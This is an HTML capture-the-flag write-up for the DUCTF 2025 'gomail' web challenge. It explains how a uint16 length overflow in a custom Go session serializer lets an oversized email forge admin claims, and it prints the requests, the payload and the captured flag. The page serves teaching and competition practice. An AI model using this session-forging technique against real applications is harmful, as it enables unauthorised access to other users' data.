@@ -1,0 +1,466 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<title>DUCTF 2025 - gomail (137 Solves)</title>
+  </head>
+  <body>
+	<div class="content-container">
+		<div class="text-container">
+			<h1>Gomail (137 Solves)</h1>
+<p>Getting started with the challenge, we're given a URL and the following source files.</p>
+<pre class="language-bash"><code class="language-bash">├── Dockerfile
+├── app
+│   ├── go.mod
+│   ├── go.sum
+│   ├── handlers.go
+│   ├── main.go
+│   ├── middleware.go
+│   ├── session
+│   │   ├── claims.go
+│   │   ├── claims_test.go
+│   │   ├── session.go
+│   │   └── session_test.go
+│   └── util.go
+└── docker-compose.yml</code></pre>
+<p>Going to the site we just get a <code>404 Not Found</code>.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/2</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-gomail-3f344244ceb2.2025.ductf.net</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/2</span> <span class="token status-code number">404</span> <span class="token reason-phrase string">Not Found</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span>
+<span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Mon, 21 Jul 2025 08:24:23 GMT</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">18</span></span>
+<span class="token text-plain">
+404 page not found
+</span></code></pre>
+<p>So lets jump straight into the source files we're given and see what's going on. The first thing I want to understand when looking at an application is the routing. Of course in this case, simply to understand what routes I should be requesting to reach some functionality. Looking at <code>main.go</code> we see some routes being defined.</p>
+<pre class="language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="token function">MaxBodyMiddleware</span><span class="token punctuation">(</span>MaxBytes<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="token function">AttachSessionMiddleware</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> LoginHandler<span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/emails"</span><span class="token punctuation">,</span> <span class="token function">SessionMiddleware</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GetEmailsHandler<span class="token punctuation">)</span>
+
+        r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0:1337"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span></code></pre>
+<p>Alright, looks like we've got <code>/login</code> and <code>/emails</code>. Before we jump into the weeds, I want to set up some 'normal' requests for each of these routes. Having a brief look at <code>loginHandler</code> and <code>GetEmailsHandler</code> I created the following standard requests.</p>
+<h4>/login Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/login</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-gomail-3f344244ceb2.2025.ductf.net</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">46</span></span>
+
+{"email":"testing@test.com","password":"test"}</code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+
+{"token":"H4sIAAAAAAAA_xJgKEktLsnMS3cA0XrJ-bmb_OozGBgYGNIAAQAA__-otIcuGwAAAA==.Chu17AzBc3RPgAgJkHWPRyb2QAVNB7B7zyIv9AQPuEE="}</code></pre>
+<h4>/emails Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/emails</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-gomail-3f344244ceb2.2025.ductf.net</span></span>
+<span class="token header"><span class="token header-name keyword">X-Auth-Token</span><span class="token punctuation">:</span> <span class="token header-value">H4sIAAAAAAAA_xJgKEktLsnMS3cA0XrJ-bmb_OozGBgYGNIAAQAA__-otIcuGwAAAA==.Chu17AzBc3RPgAgJkHWPRyb2QAVNB7B7zyIv9AQPuEE=</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+
+{"emails":[{"from":"mc-fat@monke.zip","to":"guest","subject":"Noice Try Hacker","data":"Hey hacker,\n\nTold ya you can't hack into my private email server. I have this locked down ya donke.\n\t\t"}]}</code></pre>
+<p>Just from this behaviour we can already guess that we'll be trying to get access to an email that we're not supposed to be able to access. We can confirm this by searching the source for where the flag is stored. In <code>handlers.go</code>, we see the following code.</p>
+<pre class="language-go"><code class="language-go"><span class="token keyword">var</span> fatMonkeEmail <span class="token operator">=</span> <span class="token string">"mc-fat@monke.zip"</span>
+<span class="token keyword">var</span> guestEmail <span class="token operator">=</span> <span class="token string">"guest"</span>
+
+<span class="token comment">// ...snip...</span>
+
+<span class="token keyword">var</span> emails <span class="token operator">=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span>email<span class="token punctuation">{</span>
+	fatMonkeEmail<span class="token punctuation">:</span> <span class="token punctuation">{</span>
+		email<span class="token punctuation">{</span>
+			From<span class="token punctuation">:</span>    <span class="token string">"admin@duc.tf"</span><span class="token punctuation">,</span>
+			To<span class="token punctuation">:</span>      fatMonkeEmail<span class="token punctuation">,</span>
+			Subject<span class="token punctuation">:</span> <span class="token string">"Your New Challenge Flag"</span><span class="token punctuation">,</span>
+			Data<span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">`Hey MC Fat Monke,
+
+We heard once again you accidentally leaked your flag for your last challenge...
+
+Bruh stop doing that...
+
+Here is your new flag for your challenge, please stop leaking it...
+
+Flag: %s
+
+From DUCTF Admin
+`</span><span class="token punctuation">,</span> <span class="token function">GetEnvWithDefault</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> <span class="token string">"FAKE{get_the_flag_from_the_instance}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+		<span class="token punctuation">}</span><span class="token punctuation">,</span>
+	<span class="token punctuation">}</span><span class="token punctuation">,</span>
+	guestEmail<span class="token punctuation">:</span> <span class="token punctuation">{</span>
+		email<span class="token punctuation">{</span>
+			From<span class="token punctuation">:</span>    <span class="token string">"mc-fat@monke.zip"</span><span class="token punctuation">,</span>
+			To<span class="token punctuation">:</span>      guestEmail<span class="token punctuation">,</span>
+			Subject<span class="token punctuation">:</span> <span class="token string">"Noice Try Hacker"</span><span class="token punctuation">,</span>
+			Data<span class="token punctuation">:</span> <span class="token string">`Hey hacker,
+
+Told ya you can't hack into my private email server. I have this locked down ya donke.
+		`</span><span class="token punctuation">,</span>
+		<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span></code></pre>
+<p>As we expected, the flag is inside another email. Looking at the handler for <code>/emails</code> we can get an idea of how the application decides which email should be returned.</p>
+<pre class="language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">GetEmailsHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	scr<span class="token punctuation">,</span> exists <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"sessionclaims"</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> <span class="token operator">!</span>exists <span class="token punctuation">{</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
+			<span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"could not get session handler"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">}</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">}</span>
+
+	sc <span class="token operator">:=</span> scr<span class="token punctuation">.</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>SessionClaims<span class="token punctuation">)</span>
+
+	email <span class="token operator">:=</span> sc<span class="token punctuation">.</span>Email
+	iA <span class="token operator">:=</span> sc<span class="token punctuation">.</span>IsAdmin
+	<span class="token keyword">if</span> <span class="token operator">!</span>iA <span class="token punctuation">{</span>
+		email <span class="token operator">=</span> guestEmail
+	<span class="token punctuation">}</span>
+	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
+		<span class="token string">"emails"</span><span class="token punctuation">:</span> emails<span class="token punctuation">[</span>email<span class="token punctuation">]</span><span class="token punctuation">,</span>
+	<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span></code></pre>
+<p>Reading this code, it looks like the application retrieves our <code>Email</code> and <code>IsAdmin</code> claims from our session and then returns emails based on that information. From this, we gather that there's two conditions we'd have to meet to access the flag through this route.</p>
+<ol>
+<li>Our <code>Email</code> session claim must equal <code>mc-fat@monke.zip</code> (as we saw earlier, this is the email address that the flag was sent too).</li>
+<li>Our <code>IsAdmin</code> claim must be <code>True</code>. If it's <code>False</code>, we're forced into the <code>guest</code> context, which will not return the flag.</li>
+</ol>
+<p>Clearly we need to understand how sessions are being handled. Looking into <code>session.go</code> and <code>claims.go</code>, we get the following high-level understanding of the session handling.</p>
+<ul>
+<li><code>claims.go</code> is responsible for reading and writing claims to a session. In this implementation, the session is just some serialised data.</li>
+<li><code>session.go</code> handles encoding, decoding, and signing a session.</li>
+</ul>
+<p>The following snippet shows the code in <code>claims.go</code> that is responsible for reading the <code>Email</code> and <code>IsAdmin</code> data from the session.</p>
+<pre class="language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>ss <span class="token operator">*</span>SessionSerializer<span class="token punctuation">)</span> <span class="token function">readEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>email <span class="token builtin">string</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	l<span class="token punctuation">,</span> err <span class="token operator">:=</span> ss<span class="token punctuation">.</span><span class="token function">readLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+	<span class="token punctuation">}</span>
+	eb<span class="token punctuation">,</span> err <span class="token operator">:=</span> ss<span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err
+	<span class="token punctuation">}</span>
+	<span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>eb<span class="token punctuation">)</span><span class="token punctuation">,</span> err
+<span class="token punctuation">}</span>
+
+<span class="token keyword">func</span> <span class="token punctuation">(</span>ss <span class="token operator">*</span>SessionSerializer<span class="token punctuation">)</span> <span class="token function">readIsAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>isAdmin <span class="token builtin">bool</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	iab<span class="token punctuation">,</span> err <span class="token operator">:=</span> ss<span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+		<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">,</span> err
+	<span class="token punctuation">}</span>
+	<span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>iab<span class="token punctuation">)</span> <span class="token operator">==</span> boolTrue<span class="token punctuation">,</span> <span class="token boolean">nil</span>
+<span class="token punctuation">}</span></code></pre>
+<p>Reading this code (and a bit of surrounding code that I've ommited), we understand that:</p>
+<ul>
+<li>The first two bytes of the session describe the length of the <code>Email</code> claim.</li>
+<li>The <code>readEmail</code> method checks the first two bytes for the length of <code>Email</code>, and then reads that many bytes to retrieve its value.</li>
+<li>The <code>IsAdmin</code> claim is retrieved from the final byte of the session. [*1]</li>
+</ul>
+<p>Since we're going to be interested in these reads during testing, I added a couple of lines of Go to my local instance that prints the values as they're read. This is an important step for any challenge that provides you with a deployable local instance, you must always try to use it to your advantage!</p>
+<p>Anyway, with all the context we've gathered, we understand that we really only have control over one important thing here, which is our email during login. My initial approach to testing this input was based on how sessions were being handled. There's a bunch of manual byte reads and writes, custom serialisation, and custom session handling. In these situations I like to start by testing the edge cases, the upper and lower most boundaries of the functionality. As a start, I tried logging in with a very large email, just to see how big we could go and if it would cause any errors or noticable issues we could investigate.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http">
+<span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/login</span> <span class="token http-version property">HTTP/1.1</span></span>
+...snip...
+
+{"email":"testing@test.comAAAA[...snip...]AAAA"}</code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+
+{"token":"H4sIAAAAAAAA_-zFTRFAUAAGwC-BKDIQxRh_Bxy8ADoR0Mjxdi_7DmW6ynYs3X87nnsPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlWiee02S-QsAAP__Q95sC79hAQA=.VzTsW5LrtPKuux8WYmYOS5StuNuVDOEzNt8aq5YJuSs="}
+</code></pre>
+<p>Now, unfortunately, after using this token to view <code>/emails</code> and looking at my logs, the logs were messy (I was also printing the raw bytes of the session at the time), which meant that I didn't notice anything super weird happening. For the readers sake, I'll skip the one hour detour I took here thinking that there was no issue. When I eventually tried this request again later (with cleaner logging), I noticed the following output.</p>
+<pre class="language-bash"><code class="language-bash">Admin:  <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span></code></pre>
+<p>This debug output was tracking what value was read from the <code>IsAdmin</code> claim. The typical values for <code>IsAdmin</code> were either <code>f</code> (ASCII <code>102</code>) or <code>t</code> (ASCII <code>116</code>), as below.</p>
+<pre class="language-go"><code class="language-go"><span class="token keyword">const</span> <span class="token punctuation">(</span>
+	boolTrue  <span class="token operator">=</span> <span class="token string">"t"</span>
+	boolFalse <span class="token operator">=</span> <span class="token string">"f"</span>
+<span class="token punctuation">)</span></code></pre>
+<p>However here we were reading a value of <code>A</code> (ASCII <code>65</code>)! This weirdness was obviously caused by our email input, so taking a look back at how the application writes our email to the session, we see the following code.</p>
+<pre class="language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>ss <span class="token operator">*</span>SessionSerializer<span class="token punctuation">)</span> <span class="token function">writeEmail</span><span class="token punctuation">(</span>email <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	ss<span class="token punctuation">.</span><span class="token function">writeLength</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	ss<span class="token punctuation">.</span>buf<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>
+<span class="token punctuation">}</span></code></pre>
+<p>This code seems pretty straight forward; write the length of the email into the first two bytes of the session and then write the email. Looking into the <code>writeLength</code> call however, we notice something strange.</p>
+<pre class="language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>ss <span class="token operator">*</span>SessionSerializer<span class="token punctuation">)</span> <span class="token function">writeLength</span><span class="token punctuation">(</span>l <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	el <span class="token operator">:=</span> <span class="token function">uint16</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token comment">// int -> uint16</span>
+	ss<span class="token punctuation">.</span><span class="token function">growBuf</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">)</span>
+	bs <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+	binary<span class="token punctuation">.</span>LittleEndian<span class="token punctuation">.</span><span class="token function">PutUint16</span><span class="token punctuation">(</span>bs<span class="token punctuation">,</span> el<span class="token punctuation">)</span>
+	ss<span class="token punctuation">.</span>buf<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span>
+<span class="token punctuation">}</span></code></pre>
+<p>The length of our email is being cast from type <code>int</code> to type <code>uint16</code>. This is dangerous because the application is trying to squeeze an integer (32 bit or 64 bit) into a 16 bit data type, which could lead to an unexpected overflow. To illustrate this, I've written the below Go.</p>
+<pre class="language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>MaxInt32<span class="token punctuation">)</span> <span class="token comment">// OUTPUTS: 2147483647</span>
+fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>MaxUint16<span class="token punctuation">)</span> <span class="token comment">// OUTPUTS: 65535</span>
+
+<span class="token keyword">var</span> number <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">65535</span>
+
+fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">uint16</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// OUTPUTS 65535</span>
+fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">uint16</span><span class="token punctuation">(</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// OUTPUTS 0</span>
+fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">uint16</span><span class="token punctuation">(</span>number<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// OUTPUTS 1</span></code></pre>
+<p>From this, we can see that any attempt to store a number higher than <code>65535</code> in a <code>uint16</code> will cause an overflow, starting us back at <code>0</code> and incrementing from there. In the context of the challenge, this means that when we login with an email longer than <code>65535</code> characters the 2 byte <code>length</code> variable at the start of the session gets overflown, allowing us to control the sessions understanding of how long our email really is.</p>
+<p>This is exploitable because the session relies on knowing the length of our email to determine where the values of other claims are located. To make this clearer, the below snippet describes again how claim values are retrieved.</p>
+<pre class="language-json"><code class="language-json">SESSION<span class="token operator">:</span> LENGTH<span class="token punctuation">,</span> EMAIL<span class="token punctuation">,</span> EXPIRY<span class="token punctuation">,</span> ISADMIN
+
+LENGTH = First two bytes.
+EMAIL = The next LENGTH number of bytes.
+EXPIRY = The next <span class="token number">8</span> bytes after the EMAIL.
+ISADMIN = The next <span class="token number">1</span> byte after the EXPIRY.</code></pre>
+<p>With this knowledge, lets revisit the conditions we need to meet to get the flag:</p>
+<ol>
+<li>Our <code>Email</code> claim must equal <code>mc-fat@monke.zip</code>.</li>
+<li>Our <code>IsAdmin</code> claim must be <code>True</code>.</li>
+</ol>
+<p>We know that we can control both of these fields with our integer overflow, so the plan is laid out below.</p>
+<ul>
+<li>Provide an email of length <code>65552</code> that begins with <code>mc-fat@monke.zip</code>. This sets our email to <code>mc-fat@monkey.zip</code> and addresses our first requirement. The email length was calculated as:</li>
+</ul>
+<pre class="language-json"><code class="language-json">       <span class="token number">65535</span>        +        <span class="token number">16</span>              +              <span class="token number">1</span> 
+       ^^^^^                 ^^                             ^
+(max `uint16` value) (length of `mc-fat@monke.zip`) (because when we overflow<span class="token punctuation">,</span> we start at <span class="token number">0</span>)</code></pre>
+<ul>
+<li>Ensure that the <code>25th</code> byte of our payload is the <code>t</code> character. This sets our <code>IsAdmin</code> claim to <code>True</code> and addresses our second requirement. The below session breakdown describes how the byte position was calculated:</li>
+</ul>
+<pre class="language-json"><code class="language-json">LENGTH = <span class="token number">16</span> (as a result of our overflow)
+EMAIL = mc-fat@monke.zip
+EXPIRY = The <span class="token number">8</span> bytes following mc-fat@monke.zip in our payload
+ISADMIN = The 9th byte following mc-fat@monke.zip in our payload
+
+<span class="token number">16</span>+<span class="token number">9</span> = <span class="token number">25</span> (the position where ISADMIN will be read from)</code></pre>
+<p>Using this to build out the final payload, we end up with the following request.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/login</span> <span class="token http-version property">HTTP/1.1</span></span>
+...snip...
+
+{"email":"mc-fat@monke.zipAAAAAAAAt&lt; 65527 more A's >","password":"test"}</code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+
+{"token":"H4sIAAAAAAAA_-zAwQ1AMBQA0D-CJRyZQUcR0RApDj1ZwNoutuh7XZRlyHOdynUe6_jsd_rVBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQMuif7eIiPwFAAD__3VO8MkbAAEA.-Nf2dUXbhxUF7hRROuzSBdUaZJIlxvP8A4797j7uBMg="}</code></pre>
+<p>We can then use the token to list our emails and get the flag!</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/emails</span> <span class="token http-version property">HTTP/2</span></span>
+<span class="token header"><span class="token header-name keyword">X-Auth-Token</span><span class="token punctuation">:</span> <span class="token header-value">H4sIAAAAAAAA_-zAwQ1AMBQA0D-CJRyZQUcR0RApDj1ZwNoutuh7XZRlyHOdynUe6_jsd_rVBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQMuif7eIiPwFAAD__3VO8MkbAAEA.-Nf2dUXbhxUF7hRROuzSBdUaZJIlxvP8A4797j7uBMg=</span></span>
+...snip...</code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/2</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+{
+  "emails": [
+    {
+      "from": "admin@duc.tf",
+      "to": "mc-fat@monke.zip",
+      "subject": "Your New Challenge Flag",
+      "data": "Hey MC Fat Monke,[...snip...]Flag: DUCTF{g0v3rFloW_2_mY_eM41L5!}From DUCTF Admin"
+    }
+  ]
+}</code></pre>
+<h1>Notes</h1>
+<ul>
+<li>[*1] <code>readBytes</code> uses <code>buf.Read</code>, which removes the bytes from the buffer as they're read. The <code>readIsAdmin</code> method is called after every other claim has been read, so when it reads one byte here, it is reading the final byte in the buffer.</li>
+</ul>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		body {
+			background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=");
+			font-family: 'JetBrains Mono';
+			background-color: #191B1C;
+		}
+
+		.content-container {
+			background-color: #1D2021;
+			box-sizing: content-box;
+			width: 95vw;
+			display: flex;
+			flex-direction: column;
+			justify-content: left;
+			height: 100%;
+			margin: auto;
+			margin-top: 10vh;
+			margin-bottom: 10vh;
+			border: 1px solid #B8BB26;
+			max-width: 150vh;
+		}
+
+		.text-container {
+			color: #D3C4A1;
+			padding: 1vw;
+			font-size: calc(0.7vw + 0.7vh);
+		}
+
+		ul {
+			padding-left: 2vh;	
+		}
+
+		code:not([class]) {
+			color: #B8BB26;
+			font-size: calc(0.7vw + 0.7vh);
+			font-style: italic; 
+		}
+
+		a {
+			color: #B8BB26;
+			font-weight: bold;
+			text-decoration: underline;
+		}
+
+		/**
+		 * Gruvbox dark theme
+		 *
+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: #b8bb26; /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
